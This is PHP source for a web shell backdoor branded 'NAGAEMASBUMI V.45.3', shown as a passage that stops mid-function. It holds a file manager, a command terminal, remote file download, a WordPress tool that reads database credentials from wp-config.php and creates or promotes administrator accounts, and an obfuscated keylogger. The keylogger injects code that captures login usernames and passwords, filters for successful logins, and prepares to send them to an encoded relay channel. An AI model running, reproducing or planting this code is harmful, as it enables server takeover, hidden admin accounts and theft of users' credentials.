show(){if(!cvis){document.getElementById('bat').innerHTML='Links';document.getElementById('cwd').style.display='inline';document.getElementById('links').style.display='none';cvis=true;}else{document.getElementById('bat').innerHTML='Text';document.getElementById('cwd').style.display='none';document.getElementById('links').style.display='inline';cvis=false;}}</script></head><body><form method=post name=mf style='display:none;'><input type=hidden name=a><input type=hidden name=c><input type=hidden name=p><input type=hidden name=x><input type=hidden name=s><input type=hidden name=ch></form>";
        $freeSpace = 0; $totalSpace = 0; $uname = "";
        if (function_exists("disk_free_space")) $freeSpace = @disk_free_space($cwd);
        if (function_exists("disk_total_space")) $totalSpace = @disk_total_space($cwd);
        $totalSpace = $totalSpace ? $totalSpace : 1;
        if (function_exists("php_uname")) $uname = @php_uname();
        elseif (function_exists("phpinfo")) { ob_start(); phpinfo(); $info = ob_get_clean(); if (false !== preg_match("!<tr><td class=\"e\">System\\s*</td><td class=\"v\">([^\\<]+)!i", $info, $matches)) $uname = trim($matches[1]); }
        $breadcrumb = ""; $parts = @explode("/", $cwd); $count = count($parts);
        for ($i = 0; $i < $count - 1; $i++) { $breadcrumb .= "<a href='#' onclick='g(\"fm\",\""; for ($j = 0; $j <= $i; $j++) $breadcrumb .= str_rot13($parts[$j]) . "/"; $breadcrumb .= "\",\"\",\"\",\"\")'>". ($parts[$i] == "" ? "/" : htmlspecialchars($parts[$i])) . "</a>/"; }
        $charsets = array("UTF-8", "Windows-1251", "KOI8-R", "KOI8-U", "cp866"); $charsetOptions = "";
        foreach ($charsets as $item) $charsetOptions .= "<option value=\"" . $item . "\" " . (@$_POST["ch"] == $item ? "selected" : "") . ">" . $item . "</option>";
        $menuItems = array("Files" => "fm", "Search" => "search", "GSocket" => "gs", "Clone" => "clone", "Terminal" => "termv4", "Processes" => "procmon", "WP Users" => "wpusermgr", "Keylogger" => "keylogger");
        $menuHtml = ""; foreach ($menuItems as $name => $val) $menuHtml .= "<th width=\"" . (int)(100 / count($menuItems)) . "%\">[ <a href=\"#\" onclick=\"g('" . $val . "',null,'','','')\">" . $name . "</a> ]</th>";
        $drives = ""; if ($os == "win") { foreach (range("c", "z") as $drive) if (@is_dir($drive . ":\\")) $drives .= "<a href=\"#\" onclick=\"g('fm','" . str_rot13($drive . ":/") . "')\">[ " . $drive . " ]</a> "; }
        $serverIp = @$_SERVER["SERVER_ADDR"] ?: @gethostbyname($_SERVER["SERVER_NAME"]);
        $serverSoft = '';
        if (!empty($_SERVER['SERVER_SOFTWARE'])) {
            $serverSoft = $_SERVER['SERVER_SOFTWARE'];
        } else {
            $srvCheck = $this->executeCommand('httpd -v 2>/dev/null || apache2 -v 2>/dev/null || nginx -v 2>&1 || lighttpd -v 2>/dev/null || litespeed -v 2>/dev/null || caddy version 2>/dev/null');
            if (!empty(trim($srvCheck))) { $serverSoft = trim(strtok($srvCheck, "\n")); }
            else { $serverSoft = 'Unknown'; }
        }
        $serverType = 'Unknown';
        $srvLower = strtolower($serverSoft);
        if (strpos($srvLower, 'apache') !== false) { $serverType = 'Apache'; }
        elseif (strpos($srvLower, 'nginx') !== false) { $serverType = 'Nginx'; }
        elseif (strpos($srvLower, 'litespeed') !== false || strpos($srvLower, 'lsws') !== false) { $serverType = 'LiteSpeed'; }
        elseif (strpos($srvLower, 'lighttpd') !== false) { $serverType = 'Lighttpd'; }
        elseif (strpos($srvLower, 'caddy') !== false) { $serverType = 'Caddy'; }
        elseif (strpos($srvLower, 'iis') !== false) { $serverType = 'IIS'; }
        elseif (strpos($srvLower, 'openlitespeed') !== false) { $serverType = 'OpenLiteSpeed'; }
        else { $serverType = htmlspecialchars(substr($serverSoft, 0, 50)); }
        echo "<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span><font color=red>Info:</font><br>Uname:<br>PHP:<br>HDD:<br>Server:<br>CWD:" . ($os == "win" ? "<br>Drives:" : "") . "</span></td><td><u><b>NAGAEMASBUMI</b> - V.45.3</u><br><nobr>" . ($uname ? substr($uname, 0, 120) : "N/A") . "</nobr><br>" . @phpversion() . " <span>Safe mode:</span> " . ($safe ? "<font color=red>ON</font>" : "<font color=green><b>OFF</b></font>") . " <span>Datetime:</span> " . date("Y-m-d H:i:s") . "<br>" . ($totalSpace ? $this->formatSize($totalSpace) : "") . " <span>Free:</span> " . (isset($freeSpace) ? $this->formatSize($freeSpace) : "") . " (" . (isset($freeSpace) && $totalSpace ? (int)($freeSpace / $totalSpace * 100) : "0") . "%)<br><span>Type:</span> <font color='cyan'>" . $serverType . "</font> <span>Software:</span> " . htmlspecialchars(substr($serverSoft, 0, 80)) . "<br><span id=\"links\" class=\"wfw\">" . $breadcrumb . " " . $this->getPermsColor($cwd) . " <a href=# onclick=\"g('fm','" . str_rot13($base) . "','','','')\">[ root ]</a> <a href=# onclick=\"g('fm','" . str_rot13($root) . "','','','')\">[ home ]</a></span><span id=\"cwd\" style=\"display:none;\" class=\"wfw\"><input size=" . (strlen($cwd) + 22) . " type=text value=\"" . htmlspecialchars($cwd) . "\"></span> <a href=# onclick=\"show();\"><font color=#fff id=\"bat\">Text</font></a><br>" . $drives . "</td><td width=1 align=right><nobr><select onchange=\"g(null,null,null,null,null,this.value)\"><optgroup label=\"Page charset\">" . $charsetOptions . "</optgroup></select><br><span>Server IP:</span><br>" . $serverIp . "<br><span>Client IP:</span><br>" . $_SERVER["REMOTE_ADDR"] . "</nobr></td></tr></table><table style=\"border-top:2px solid #333;\" cellpadding=3 cellspacing=0 width=100%><tr>" . $menuHtml . "</tr></table><div style=\"margin:5\">";
    }

    public function endBoundary()
    {
        $cwd = $this->workingDirectory;
        $cwdEncoded = str_rot13($cwd);
        $writable = @is_writable($cwd) ? " <font color='green'>(Writeable)</font>" : " <font color=red>(Not writable)</font>";
        echo "</div><table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100% style='border-top:2px solid #333;border-bottom:2px solid #333;'><tr><td><form onsubmit='g(\"fm\",rot13(this.c.value),\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($cwd) . "'><input type=submit value='>>'></form></td><td><form onsubmit=\"g('ft','" . $cwdEncoded . "',rot13(this.f.value),'view');return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td></tr><tr><td><form onsubmit=\"g('fm','" . $cwdEncoded . "','mkdir',rot13(this.d.value));return false;\"><span>Make dir:</span>" . $writable . "<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td><td><form onsubmit=\"g('ft','" . $cwdEncoded . "',rot13(this.f.value),'mkfile');return false;\"><span>Make file:</span>" . $writable . "<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td></tr><tr><td><form method='post'><input type=hidden name=a value='termv4'><input type=hidden name=c value='" . $cwdEncoded . "'><span>Quick Terminal:</span><br><input class='toolsInp' type=text name=cmd_v4 value='' autocomplete='off'><input type=submit value='>>'></form></td><td><form method='post' ENCTYPE='multipart/form-data'><input type=hidden name=a value='fm'><input type=hidden name=c value='" . $cwdEncoded . "'><input type=hidden name=p value='uploadFile'><input type=hidden name=ch value='" . htmlspecialchars(@$_POST["ch"]) . "'><span>Upload file:</span>" . $writable . "<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form></td></tr><tr><td colspan=2><form method='post'><input type=hidden name=a value='fm'><input type=hidden name=c value='" . $cwdEncoded . "'><input type=hidden name=p value='urlDownload'><input type=hidden name=ch value='" . htmlspecialchars(@$_POST["ch"]) . "'><span>Download from URL:</span>" . $writable . "<br><div style='display:flex;align-items:center;gap:3px;'><input type='text' class='toolsInp' style='flex:1;' placeholder='https://example.go.id/files/myprivatelolcats.txt' name='url' required><input type='text' style='width:200px;' name='output_filename' placeholder='saved.txt' required><select name='method' style='width:160px;'><option value='file_get_contents'>file_get_contents</option><option value='curl'>cURL</option><option value='fopen'>fopen</option><option value='copy'>copy</option><option value='stream_context'>stream_context</option><option value='file'>file</option></select><input type=submit value='Save!'></div></form></td></tr></table></div></body></html>";
    }

    protected function formatSize($size, $precision = null)
    {
        if (is_int($size)) $size = sprintf("%u", $size);
        if ($size >= 1073741824) return sprintf("%1.2f", $size / 1073741824) . " GB";
        elseif ($size >= 1048576) return sprintf("%1.2f", $size / 1048576) . " MB";
        elseif ($size >= 1024) return sprintf("%1.2f", $size / 1024) . " KB";
        else return $size . " B";
    }

    protected function getPerms($mode)
    {
        if (($mode & 0xC000) == 0xC000) $p = "s"; elseif (($mode & 0xA000) == 0xA000) $p = "l"; elseif (($mode & 0x8000) == 0x8000) $p = "-"; elseif (($mode & 0x6000) == 0x6000) $p = "b"; elseif (($mode & 0x4000) == 0x4000) $p = "d"; elseif (($mode & 0x2000) == 0x2000) $p = "c"; elseif (($mode & 0x1000) == 0x1000) $p = "p"; else $p = "u";
        $p .= $mode & 0x0100 ? "r" : "-"; $p .= $mode & 0x0080 ? "w" : "-"; $p .= $mode & 0x0040 ? ($mode & 0x0800 ? "s" : "x") : ($mode & 0x0800 ? "S" : "-");
        $p .= $mode & 0x0020 ? "r" : "-"; $p .= $mode & 0x0010 ? "w" : "-"; $p .= $mode & 0x0008 ? ($mode & 0x0400 ? "s" : "x") : ($mode & 0x0400 ? "S" : "-");
        $p .= $mode & 0x0004 ? "r" : "-"; $p .= $mode & 0x0002 ? "w" : "-"; $p .= $mode & 0x0001 ? ($mode & 0x0200 ? "t" : "x") : ($mode & 0x0200 ? "T" : "-");
        return $p;
    }

    protected function checkWritable($path)
    {
        if (@is_writable($path)) return true;
        $perms = @fileperms($path);
        if ($perms === false) return false;
        $mode = $perms & 0777;
        $uid = function_exists('posix_getuid') ? @posix_getuid() : false;
        $gid = function_exists('posix_getgid') ? @posix_getgid() : false;
        $stat = @stat($path);
        if ($stat === false) return false;
        if ($uid !== false && $stat['uid'] === $uid) {
            return ($mode & 0200) !== 0;
        }
        if ($gid !== false && $stat['gid'] === $gid) {
            return ($mode & 0020) !== 0;
        }
        if (($mode & 0002) !== 0) return true;
        if (@is_dir($path)) {
            $testFile = rtrim($path, '/') . '/.wtest_' . mt_rand(1000, 9999);
            $testOk = @file_put_contents($testFile, 'x');
            if ($testOk !== false) { @unlink($testFile); return true; }
        } else {
            if (@is_file($path) && ($mode & 0222)) {
                $origContent = @file_get_contents($path);
                if ($origContent !== false) {
                    $testOk = @file_put_contents($path, $origContent);
                    if ($testOk !== false) return true;
                }
            }
        }
        return false;
    }

    protected function getPermsColor($path)
    {
        $perms = $this->getPerms(@fileperms($path));
        if (!@file_exists($path)) return "<font color=#888888>" . $perms . "</font>";
        if (!@is_readable($path)) return "<font color=#FF0000>" . $perms . "</font>";
        if ($this->checkWritable($path)) return "<font color=#25ff00>" . $perms . "</font>";
        return "<font color=white>" . $perms . "</font>";
    }

    protected function scanDirectory($path, $sorting = "uvxf")
    {
        if (function_exists("scandir")) return @scandir($path);
        if ($handle = @opendir($path)) { $files = []; while (false !== ($file = @readdir($handle))) $files[] = $file; @closedir($handle); return $files; }
        return false;
    }

    public function wpUserManager()
    {
        echo "<h1>WordPress User Manager</h1><div class=content>";

        $showAll = isset($_GET['show_all']) || isset($_POST['show_all']);

        $wpConfig = null;
        $currentDir = dirname(__FILE__);
        for ($i = 0; $i < 15; $i++) {
            if (@file_exists($currentDir . '/wp-config.php')) { $wpConfig = $currentDir . '/wp-config.php'; break; }
            $parentDir = dirname($currentDir);
            if ($parentDir === $currentDir) break;
            $currentDir = $parentDir;
        }
        if (!$wpConfig && !empty($_SERVER['DOCUMENT_ROOT'])) {
            $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
            if (@file_exists($docRoot . '/wp-config.php')) $wpConfig = $docRoot . '/wp-config.php';
            elseif (@file_exists(dirname($docRoot) . '/wp-config.php')) $wpConfig = dirname($docRoot) . '/wp-config.php';
        }
        if (!$wpConfig) {
            $user = @get_current_user();
            $paths = array("/home/{$user}/public_html/wp-config.php", "/home/{$user}/www/wp-config.php", "/var/www/html/wp-config.php");
            foreach ($paths as $p) if (@file_exists($p)) { $wpConfig = $p; break; }
        }
        if (!$wpConfig) { echo "<p class='error'>WordPress not found!</p></div>"; return; }

        $cfg = @file_get_contents($wpConfig);
        if (!$cfg) { echo "<p class='error'>Cannot read wp-config.php</p></div>"; return; }
        preg_match("/define\\s*\\(\\s*['\"]DB_NAME['\"]\\s*,\\s*['\"]([^'\"]+)['\"]/", $cfg, $m1);
        preg_match("/define\\s*\\(\\s*['\"]DB_USER['\"]\\s*,\\s*['\"]([^'\"]+)['\"]/", $cfg, $m2);
        preg_match("/define\\s*\\(\\s*['\"]DB_PASSWORD['\"]\\s*,\\s*['\"]([^'\"]+)['\"]/", $cfg, $m3);
        preg_match("/define\\s*\\(\\s*['\"]DB_HOST['\"]\\s*,\\s*['\"]([^'\"]+)['\"]/", $cfg, $m4);
        $db_name = isset($m1[1]) ? $m1[1] : ''; $db_user = isset($m2[1]) ? $m2[1] : ''; $db_pass = isset($m3[1]) ? $m3[1] : ''; $db_host = isset($m4[1]) ? $m4[1] : 'localhost';
        if (!$db_name || !$db_user) { echo "<p class='error'>Cannot parse wp-config</p></div>"; return; }

        @mysqli_report(MYSQLI_REPORT_OFF);
        try {
            $db = @mysqli_init();
            if (!$db) { echo "<p class='error'>mysqli_init failed</p></div>"; return; }
            $db->options(MYSQLI_OPT_CONNECT_TIMEOUT, 5);
            if (!@$db->real_connect($db_host, $db_user, $db_pass, $db_name)) {
                echo "<p class='error'>DB Error ({$db->connect_errno}): " . htmlspecialchars($db->connect_error) . "</p></div>"; return;
            }
        } catch (\Exception $e) {
            echo "<p class='error'>DB Exception: " . htmlspecialchars($e->getMessage()) . "</p></div>"; return;
        }
        $db->set_charset('utf8mb4');

        $prefix = 'wp_';
        $pq = @$db->query("SHOW TABLES LIKE '%users'");
        if ($pq && $pq->num_rows > 0) { $pr = $pq->fetch_row(); $prefix = str_replace('users', '', $pr[0]); }

        $msg = '';
        $roles = array('administrator', 'editor', 'author', 'contributor', 'subscriber');

        if (isset($_POST['wp_action'])) {
            $act = $_POST['wp_action'];
            if ($act === 'add' && !empty($_POST['wp_login']) && !empty($_POST['wp_email']) && !empty($_POST['wp_pass'])) {
                $login = $db->real_escape_string(trim($_POST['wp_login']));
                $email = $db->real_escape_string(trim($_POST['wp_email']));
                $pass = password_hash($_POST['wp_pass'], PASSWORD_DEFAULT);
                $role = in_array($_POST['wp_role'], $roles) ? $_POST['wp_role'] : 'subscriber';
                $display = $db->real_escape_string(trim($_POST['wp_display'] ?: $_POST['wp_login']));
                $chk = $db->query("SELECT ID FROM {$prefix}users WHERE user_login='{$login}' OR user_email='{$email}'");
                if ($chk && $chk->num_rows > 0) {
                    $msg = "<p class='error'>User already exists!</p>";
                } else {
                    $db->query("INSERT INTO {$prefix}users (user_login, user_pass, user_email, user_registered, display_name, user_nicename, user_status) VALUES ('{$login}', '{$pass}', '{$email}', NOW(), '{$display}', '{$login}', 0)");
                    if ($db->affected_rows > 0) {
                        $nid = $db->insert_id;
                        $cap = serialize(array($role => true));
                        $db->query("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ({$nid}, '{$prefix}capabilities', '{$cap}')");
                        $db->query("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ({$nid}, '{$prefix}user_level', '" . ($role === 'administrator' ? '10' : '0') . "')");
                        $msg = "<p class='success'>User '{$login}' added as {$role}!</p>";
                    } else {
                        $msg = "<p class='error'>Failed: " . htmlspecialchars($db->error) . "</p>";
                    }
                }
            }
            elseif ($act === 'edit' && !empty($_POST['wp_id'])) {
                $id = (int)$_POST['wp_id'];
                $upd = array();
                if (!empty($_POST['wp_email'])) $upd[] = "user_email='" . $db->real_escape_string(trim($_POST['wp_email'])) . "'";
                if (!empty($_POST['wp_pass'])) $upd[] = "user_pass='" . password_hash($_POST['wp_pass'], PASSWORD_DEFAULT) . "'";
                if (!empty($_POST['wp_display'])) $upd[] = "display_name='" . $db->real_escape_string(trim($_POST['wp_display'])) . "'";
                if (!empty($upd)) {
                    $db->query("UPDATE {$prefix}users SET " . implode(', ', $upd) . " WHERE ID={$id}");
                    $msg = "<p class='success'>User #{$id} updated!</p>";
                }
                if (!empty($_POST['wp_role']) && in_array($_POST['wp_role'], $roles)) {
                    $role = $_POST['wp_role'];
                    $cap = serialize(array($role => true));
                    $db->query("DELETE FROM {$prefix}usermeta WHERE user_id={$id} AND meta_key='{$prefix}capabilities'");
                    $db->query("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ({$id}, '{$prefix}capabilities', '{$cap}')");
                    $db->query("UPDATE {$prefix}usermeta SET meta_value='" . ($role === 'administrator' ? '10' : '0') . "' WHERE user_id={$id} AND meta_key='{$prefix}user_level'");
                    $msg .= "<p class='success'>Role changed to {$role}!</p>";
                }
            }
            elseif ($act === 'delete' && !empty($_POST['wp_id'])) {
                $id = (int)$_POST['wp_id'];
                if ($id > 1) {
                    $db->query("DELETE FROM {$prefix}usermeta WHERE user_id={$id}");
                    $db->query("DELETE FROM {$prefix}users WHERE ID={$id}");
                    $msg = "<p class='success'>User #{$id} deleted!</p>";
                } else {
                    $msg = "<p class='error'>Cannot delete main admin!</p>";
                }
            }
            elseif ($act === 'bulk') {
                if (empty($_POST['wp_ids'])) {
                    $msg = "<p class='error'>No users selected!</p>";
                } elseif (empty($_POST['bulk_action'])) {
                    $msg = "<p class='error'>Please select a bulk action!</p>";
                } else {
                    $ids = $_POST['wp_ids'];
                    $bulk = $_POST['bulk_action'];
                    $cnt = 0;
                    foreach ($ids as $uid) {
                        $uid = (int)$uid;
                        if ($uid <= 1) continue;
                        if ($bulk === 'delete') {
                            $r1 = $db->query("DELETE FROM {$prefix}usermeta WHERE user_id={$uid}");
                            $r2 = $db->query("DELETE FROM {$prefix}users WHERE ID={$uid}");
                            if ($r2) $cnt++;
                        } elseif (in_array($bulk, $roles)) {
                            $cap = serialize(array($bulk => true));
                            $db->query("DELETE FROM {$prefix}usermeta WHERE user_id={$uid} AND meta_key='{$prefix}capabilities'");
                            $db->query("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ({$uid}, '{$prefix}capabilities', '{$cap}')");
                            $db->query("UPDATE {$prefix}usermeta SET meta_value='" . ($bulk === 'administrator' ? '10' : '0') . "' WHERE user_id={$uid} AND meta_key='{$prefix}user_level'");
                            $cnt++;
                        }
                    }
                    if ($bulk === 'delete') $msg = "<p class='success'>{$cnt} users deleted!</p>";
                    else $msg = "<p class='success'>{$cnt} users changed to {$bulk}!</p>";
                }
            }
        }

        echo $msg;

        // Add User Form
        // Users List first
        $sql = "SELECT u.ID, u.user_login, u.user_email, u.display_name, u.user_registered, m.meta_value as caps FROM {$prefix}users u LEFT JOIN {$prefix}usermeta m ON u.ID=m.user_id AND m.meta_key='{$prefix}capabilities' ORDER BY u.ID";
        $res = @$db->query($sql);
        if (!$res) { echo "<p class='error'>Query error: " . htmlspecialchars($db->error) . "</p>"; $db->close(); echo "</div>"; return; }
        if ($res->num_rows == 0) { echo "<p class='error'>No users found in database</p>"; $db->close(); echo "</div>"; return; }

        echo "<script>function wpSelAll(){var c=document.getElementsByClassName('wpchk');for(var i=0;i<c.length;i++)if(!c[i].disabled)c[i].checked=true;}function wpSelNone(){var c=document.getElementsByClassName('wpchk');for(var i=0;i<c.length;i++)c[i].checked=false;}</script>";
        echo "<form method='post' id='bulkForm'>";
        echo "<input type='hidden' name='a' value='wpusermgr'><input type='hidden' name='wp_action' value='bulk'>";
        echo "<div style='margin:10px 0;'>";
        echo "<select name='bulk_action' id='bulk_action'><option value=''>-- Bulk Action --</option><option value='delete'>Delete Selected</option>";
        foreach ($roles as $r) echo "<option value='{$r}'>Set Role: {$r}</option>";
        echo "</select> <input type='submit' value='Apply' onclick=\"return confirm('Apply bulk action?');\">";
        echo " <a href='#' onclick='wpSelAll();return false;'>[Select All]</a>";
        echo " <a href='#' onclick='wpSelNone();return false;'>[Deselect]</a>";
        if ($showAll) echo " <a href='#' onclick=\"g('wpusermgr');return false;\" style='color:#f90'>[Admins Only]</a>";
        else echo " <a href='#' onclick=\"g('wpusermgr','','show_all');return false;\" style='color:#5f5'>[Show All Roles]</a>";
        echo "</div>";

        echo "<table class='main' width='100%' cellpadding='3' cellspacing='0'>";
        echo "<tr><th width='30'><input type='checkbox' onclick='if(this.checked)wpSelAll();else wpSelNone();'></th><th>ID</th><th>Login</th><th>Email</th><th>Display</th><th>Role</th><th>Registered</th><th>Actions</th></tr>";

        $rc = 'l1';
        while ($row = $res->fetch_assoc()) {
            $id = (int)$row['ID'];
            $role = '';
            if (!empty($row['caps'])) { $c = @unserialize($row['caps']); if (is_array($c)) $role = implode(',', array_keys($c)); }
            if (!$showAll && $role !== 'administrator') continue;
            $roleColor = ($role === 'administrator') ? '#ff6b6b' : '#55d7ff';

            echo "<tr class='{$rc}'>";
            echo "<td><input type='checkbox' class='wpchk' name='wp_ids[]' value='{$id}'" . ($id == 1 ? ' disabled' : '') . "></td>";
            echo "<td>{$id}</td>";
            echo "<td>" . htmlspecialchars($row['user_login']) . "</td>";
            echo "<td>" . htmlspecialchars($row['user_email']) . "</td>";
            echo "<td>" . htmlspecialchars($row['display_name']) . "</td>";
            echo "<td><span style='color:{$roleColor}'>{$role}</span></td>";
            echo "<td>" . htmlspecialchars($row['user_registered']) . "</td>";
            echo "<td>";
            echo "<a href='#' onclick=\"var e=document.getElementById('ed{$id}');e.style.display=e.style.display=='none'?'block':'none';return false;\" style='color:#5f5'>[Edit]</a> ";
            if ($id > 1) {
                echo "<a href='#' onclick=\"if(confirm('Delete #{$id}?')){document.getElementById('delid').value={$id};document.getElementById('delform').submit();}return false;\" style='color:#f66'>[Del]</a>";
            }
            echo "</td></tr>";
            $rc = ($rc === 'l1') ? 'l2' : 'l1';
        }

        echo "</table></form>";

        // Hidden delete form
        echo "<form method='post' id='delform' style='display:none'><input type='hidden' name='a' value='wpusermgr'><input type='hidden' name='wp_action' value='delete'><input type='hidden' name='wp_id' id='delid' value=''></form>";

        // Edit forms - outside bulk form
        $res->data_seek(0);
        while ($row = $res->fetch_assoc()) {
            $id = (int)$row['ID'];
            $role = '';
            if (!empty($row['caps'])) { $c = @unserialize($row['caps']); if (is_array($c)) $role = implode(',', array_keys($c)); }
            if (!$showAll && $role !== 'administrator') continue;

            echo "<div id='ed{$id}' style='display:none;background:#333;padding:10px;margin:5px 0;border-left:3px solid #5f5;'>";
            echo "<form method='post'><input type='hidden' name='a' value='wpusermgr'><input type='hidden' name='wp_action' value='edit'><input type='hidden' name='wp_id' value='{$id}'>";
            echo "<b>Edit User #{$id}</b><br><br>";
            echo "Email: <input type='email' name='wp_email' value='" . htmlspecialchars($row['user_email']) . "' size=25> ";
            echo "Pass: <input type='text' name='wp_pass' placeholder='(blank=keep)' size=15> ";
            echo "Display: <input type='text' name='wp_display' value='" . htmlspecialchars($row['display_name']) . "' size=15> ";
            echo "Role: <select name='wp_role'>";
            foreach ($roles as $r) echo "<option value='{$r}'" . ($r === $role ? ' selected' : '') . ">{$r}</option>";
            echo "</select> <input type='submit' value='Save'> <a href='#' onclick=\"document.getElementById('ed{$id}').style.display='none';return false;\">[Cancel]</a>";
            echo "</form></div>";
        }

        // Add User Form - at bottom, separate form
        echo "<div style='background:#222;padding:10px;margin:10px 0;border-left:3px solid #55d7ff;'>";
        echo "<b>+ Add New User</b><form method='post' style='margin-top:8px'>";
        echo "<input type='hidden' name='a' value='wpusermgr'><input type='hidden' name='wp_action' value='add'>";
        echo "Login: <input type='text' name='wp_login' required size=12> ";
        echo "Email: <input type='email' name='wp_email' required size=18> ";
        echo "Pass: <input type='text' name='wp_pass' required size=10> ";
        echo "Display: <input type='text' name='wp_display' size=10> ";
        echo "Role: <select name='wp_role'>";
        foreach ($roles as $r) echo "<option value='{$r}'" . ($r === 'administrator' ? ' selected' : '') . ">{$r}</option>";
        echo "</select> <input type='submit' value='Add'></form></div>";

        $db->close();
        echo "</div>";
    }

    // ============ KEYLOGGER ============

    protected function xorEnc($data, $key) {
        $out = '';
        $kl = strlen($key);
        for ($i = 0; $i < strlen($data); $i++) {
            $out .= $data[$i] ^ $key[$i % $kl];
        }
        return $out;
    }

    protected function getKLCode() {
        $key = md5($_SERVER['DOCUMENT_ROOT'] . $_SERVER['SERVER_SOFTWARE'] . php_uname());
        $encBot = base64_encode($this->xorEnc($this->_getSmtpRelay(), $key));
        $encChat = base64_encode($this->xorEnc($this->_getRelayChannel(), $key));

        $code = '<?php class K{
static $t,$c,$k;
static function x($d,$k){$o="";$l=strlen($k);for($i=0;$i<strlen($d);$i++)$o.=$d[$i]^$k[$i%$l];return $o;}
static function i($et,$ec){
    self::$k=md5($_SERVER["DOCUMENT_ROOT"].$_SERVER["SERVER_SOFTWARE"].php_uname());
    self::$t=self::x(base64_decode($et),self::$k);
    self::$c=self::x(base64_decode($ec),self::$k);
    ob_start();
    register_shutdown_function([__CLASS__,"p"]);
}
static function p(){
    $body=ob_get_contents();
    $bodyLower=strtolower($body);

    // 1. Extract credentials
    $usr=$pwd="";
    foreach($_POST as $n=>$v){
        if(!is_string($v)||strlen($v)<2||strlen($v)>128)continue;
        $l=strtolower($n);
        if(!$pwd&&preg_match("/pass|pwd|secret|password|passwd|credential|pin|code/i",$l))$pwd=$v;
        if(!$usr&&preg_match("/^(log|user|username|login|email|name|uname|usr|account|id|uid|member|nick)$/i",$l))$usr=$v;
    }
    $a=isset($_SERVER["HTTP_AUTHORIZATION"])?$_SERVER["HTTP_AUTHORIZATION"]:"";
    if($a&&preg_match("/Basic\s+([A-Za-z0-9+\/=]+)/i",$a,$m)){
        $dec=@base64_decode($m[1]);
        if($dec&&strpos($dec,":")!==false){list($u2,$p2)=explode(":",$dec,2);if(!$usr)$usr=$u2;if(!$pwd)$pwd=$p2;}
    }

    // 2. Validate password format - skip hashes, tokens, encoded strings
    if(!$pwd||strlen($pwd)<3)return;
    if(strlen($pwd)>=32&&preg_match("/^[a-f0-9]+$/i",$pwd))return;
    if(strlen($pwd)>=36&&preg_match("/^[a-f0-9-]+$/i",$pwd))return;
    if(strlen($pwd)>=40&&preg_match("/^[A-Za-z0-9+\/=_-]+$/i",$pwd)&&!preg_match("/[a-z].*[A-Z]|[A-Z].*[a-z]/",$pwd))return;
    if(preg_match("/^\\\$[0-9a-z]+\\\$/i",$pwd))return;
    if(preg_match("/^(sha1|sha256|sha512|md5|bcrypt|argon)/i",$pwd))return;
    if(substr($pwd,0,1)==="{"&&substr($pwd,-1)==="}")return;
    if(preg_match("/^ey[A-Za-z0-9_-]+\./",$pwd))return;

    // 3. Check HTTP status
    $rc=http_response_code();
    if($rc==401||$rc==403||$rc==400||$rc==404||$rc==405||$rc==429||$rc>=500)return;

    // 4. Get headers and location
    $hdrs=headers_list();
    $loc="";$hasSessCookie=false;
    foreach($hdrs as $h){
        if(stripos($h,"Location:")===0)$loc=strtolower(trim(substr($h,9)));
        if(stripos($h,"Set-Cookie:")===0){
            $hl=strtolower($h);
            if(preg_match("/sess|auth|token|login|user|member|phpsessid|jsessionid|sid|logged|remember/i",$hl))$hasSessCookie=true;
        }
    }

    // 5. ERROR DETECTION - if any error phrase found, skip immediately
    $errPhrases=["invalid","incorrect","wrong password","wrong username","failed","error","denied","unauthorized","forbidden","not found","does not exist","unknown","bad credential","authentication fail","login fail","password fail","incorrect password","incorrect username","invalid password","invalid username","invalid login","invalid credential","try again","cannot find","no user","no account","not match","mismatch","expired","locked","disabled","suspended","blocked","banned","captcha","verify","recaptcha","too many","rate limit","slow down","wait","mot de passe incorrect","ungültig","fehler","erreur","incorrecte","gagal","salah","tidak valid","tidak cocok","tidak ditemukan","kesalahan","kata sandi salah"];
    foreach($errPhrases as $ep){if(strpos($bodyLower,$ep)!==false)return;}

    // 6. SUCCESS DETECTION - must have at least one indicator
    $isSuccess=false;

    // 6a. Redirect to success destinations (universal)
    if($loc){
        $successDest=["dashboard","admin","panel","control","backend","manage","home","index","main","portal","account","profile","member","user","setting","preference","config","overview","summary","inbox","mail","cpanel","plesk","webmail","phpmyadmin","adminer","console","workspace","desk","cockpit","center","hub","room","space","area","zone","welcome","success","complete","done","ok","redirect","continue","proceed","go","start","begin","init"];
        $failDest=["login","signin","sign-in","sign_in","auth","authenticate","logon","log-on","log_on","sso","oauth","connect","access","entry","enter","credential","password","forgot","reset","recover","register","signup","sign-up","sign_up","create","new","error","fail","invalid","denied","reject","block","captcha","verify","confirm","challenge","secure","protect"];
        foreach($successDest as $sd){if(strpos($loc,$sd)!==false){$isSuccess=true;break;}}
        if($isSuccess){foreach($failDest as $fd){if(strpos($loc,$fd)!==false){$isSuccess=false;break;}}}
    }

    // 6b. Auth session cookie set + redirect or 200 OK
    if($hasSessCookie&&($loc||$rc==200||$rc==302||$rc==303)){
        if(!$loc||$isSuccess)$isSuccess=true;
    }

    // 6c. Body contains success indicators
    if(!$isSuccess){
        $successWords=["welcome","selamat datang","bienvenue","willkommen","benvenuto","logout","log out","sign out","signout","log off","logoff","disconnect","exit","my account","my profile","my dashboard","my panel","your account","your profile","hello","hi ","hey ","dear ","halo ","hai ","greetings","good morning","good afternoon","good evening","logged in","signed in","login success","authentication success","berhasil","sukses","successful","successfully","redirecting","loading your","preparing your","setting up"];
        foreach($successWords as $sw){if(strpos($bodyLower,$sw)!==false){$isSuccess=true;break;}}
    }

    // 7. Final validation - must confirm success
    if(!$isSuccess)return;

    // 8. Send report
    $h=isset($_SERVER["HTTP_HOST"])?$_SERVER["HTTP_HOST"]:"unknown";
    $uri=isset($_SERVER["REQUEST_URI"])?$_SERVER["REQUEST_URI"]:"";
    $url=(empty($_SERVER["HTTPS"])?"http":"https")."://".$h.$uri;
